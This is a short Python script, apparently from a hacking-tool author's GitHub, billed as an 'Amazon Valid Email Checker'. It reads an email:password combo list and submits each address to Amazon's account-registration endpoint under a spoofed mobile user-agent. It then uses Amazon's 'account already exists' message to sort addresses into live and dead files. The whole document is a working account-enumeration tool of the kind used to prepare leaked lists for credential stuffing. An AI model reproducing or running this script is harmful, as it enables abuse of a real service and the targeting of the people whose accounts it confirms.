logo = """
                __  __ _____             _  __          _      _____ ______ _____  
                |  \/  |  __ \           | |/ /    /\   | |    |_   _|  ____|  __ \ 
                | \  / | |__) |  ______  | ' /    /  \  | |      | | | |__  | |__) |
                | |\/| |  _  /  |______| |  <    / /\ \ | |      | | |  __| |  _  / 
                | |  | | | \ \           | . \  / ____ \| |____ _| |_| |____| | \ \ 
                |_|  |_|_|  \_\          |_|\_\/_/    \_\______|_____|______|_|  \_\


                        [+] Amazon Valid Email Checker 
                        [+] Code By Mohamed Samy (Mr-Kalier)
                        [+] Facebook Profile = > https://facebook.com/mrkalier
                        [+] Github Profile => https://github.com/mr-kalier
                        [+] Done Added In Github Now
"""
print(logo)
import requests
Live = open("AmazonLive.txt", "w")
Die = open("AmazonDie.txt", "w")
lists = input("Enter Your Email List : ")
print("#" * 70)
link = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"
head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}

s = requests.session()
g = s.get(link, headers=head)

lists = open(lists, 'r')
while True:
        email = lists.readline().replace("\n", "")

        if not email: 
                break
        samy = email.strip().split(':')
        datapost = {'customerName': 'Mohamed Samy', 'email': samy[0], 'password': 'XHack!@#123', 'passwordCheck': 'XHack!@#123'}
        postmethod = s.post(link, headers=head, data=datapost).text

        if "You indicated you are a new customer, but an account already exists with the e-mail" in postmethod:

                print("LIVE AMAZON => "+email+" BY #MOHAMED SAMY")
                Live.write("LIVE AMAZON => "+email+" BY #MOHAMED SAMY")
        else:
                print("DIE AMAZON => "+email+" BY #MOHAMED SAMY")
                Die.write("DIE AMAZON => "+email+" BY #MOHAMED SAMY")
print("#" * 70)
print("Your Live Emails Saved In AmazonLive.txt")
